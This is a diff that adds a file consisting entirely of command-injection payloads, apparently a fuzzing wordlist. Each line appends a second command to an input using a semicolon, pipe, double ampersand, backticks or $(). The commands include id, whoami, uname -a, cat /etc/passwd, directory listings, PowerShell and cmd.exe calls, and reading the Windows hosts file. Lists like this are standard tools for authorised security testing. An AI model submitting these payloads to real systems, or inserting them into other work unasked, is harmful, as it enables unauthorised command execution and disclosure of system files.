@@ -1,0 +1,65 @@
+; id
+&& id
+| id
+`id`
+$(id)
+; whoami
+| whoami
+&& whoami
+`whoami`
+$(whoami)
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+$(uname -a)
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; ls /
+| ls /
+&& ls /
+`ls /`
+$(ls /)
+; ping -c 1 127.0.0.1
+| ping -c 1 127.0.0.1
+&& ping -c 1 127.0.0.1
+`ping -c 1 127.0.0.1`
+$(ping -c 1 127.0.0.1)
+; curl http://localhost/
+| curl http://localhost/
+&& curl http://localhost/
+`curl http://localhost/`
+$(curl http://localhost/)
+; nslookup localhost
+| nslookup localhost
+&& nslookup localhost
+`nslookup localhost`
+$(nslookup localhost)
+; powershell -Command "Get-Process"
+| powershell -Command "Get-Process"
+&& powershell -Command "Get-Process"
+`powershell -Command "Get-Process"`
+$(powershell -Command "Get-Process")
+; cmd.exe /c dir
+| cmd.exe /c dir
+&& cmd.exe /c dir
+`cmd.exe /c dir`
+$(cmd.exe /c dir)
+; echo %USERNAME%
+| echo %USERNAME%
+&& echo %USERNAME%
+`echo %USERNAME%`
+$(echo %USERNAME%)
+; type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+&& type C:\Windows\System32\drivers\etc\hosts
+`type C:\Windows\System32\drivers\etc\hosts`
+$(type C:\Windows\System32\drivers\etc\hosts)
+; powershell -Command "Invoke-WebRequest http://localhost/"
+| powershell -Command "Invoke-WebRequest http://localhost/"
+&& powershell -Command "Invoke-WebRequest http://localhost/"
+`powershell -Command "Invoke-WebRequest http://localhost/"`
+$(powershell -Command "Invoke-WebRequest http://localhost/")
